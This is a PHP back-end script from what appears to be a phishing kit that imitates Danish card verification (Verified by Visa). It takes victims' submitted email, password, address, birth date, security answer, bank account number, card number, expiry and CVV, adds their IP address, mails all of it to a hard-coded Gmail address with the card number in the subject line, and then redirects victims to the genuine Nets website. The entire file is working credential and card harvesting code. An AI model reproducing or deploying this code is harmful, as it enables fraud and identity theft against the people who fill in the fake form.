<?
$ip = getenv("REMOTE_ADDR");
$message .= "|---------------- DK VBV Rezult-------------------|\n";
$message .= "|------------------- Bets-Boys -----------------------|\n";
$message .= "|Email : ".$_POST['em']."\n";
$message .= "|Password : ".$_POST['pss']."\n";
$message .= "|Nom : ".$_POST['nom']."\n";
$message .= "|Tel : ".$_POST['telnumber']."\n";
$message .= "|Adress : ".$_POST['din']."\n";
$message .= "|Code Postale : ".$_POST['zipcode']."\n";
$message .= "|Ville : ".$_POST['city']."\n";
$message .= "|Date De Naissance : ".$_POST['bdateday']."/".$_POST['bdatemonth']."/".$_POST['bdateyear']."\n";
$message .= "|Question securite : ".$_POST['secquestion']."\n";
$message .= "|Reponse securite : ".$_POST['answer']."\n";
$message .= "|Votre Banque : ".$_POST['bankname']."\n";
$message .= "|Numero de compte : ".$_POST['ssn']."\n";
$message .= "|Numero de client : ".$_POST['sgclient']."\n";
$message .= "|Numero de carte : ".$_POST['cartnumber']."\n";
$message .= "|Date D'expiration : ".$_POST['cc4expmonth']."/".$_POST['expYear']."\n";
$message .= "|CVV : ".$_POST['cvv']."\n";
$message .= "|------------------ IP Infos --------------------------|\n";
$message .= "|IP : $ip\n";
$message .= "|--------------- By Proanazz-404 ---------------|\n";
$message .= "IP : $ip\n";
$message .= "--------------- ---------------\n";

$send = "proanazz2012@gmail.com";

$subject = "[DK VBV]- ".$_POST['cartnumber']."\n";

$from = "From: ProAnaZz-404<Anahowahada@j3.com>";

mail($send,$subject,$message,$from);

echo '<script language="Javascript">

document.location.replace("http://www.nets.eu/dk-da/Pages/default.aspx");

</script>';

?> 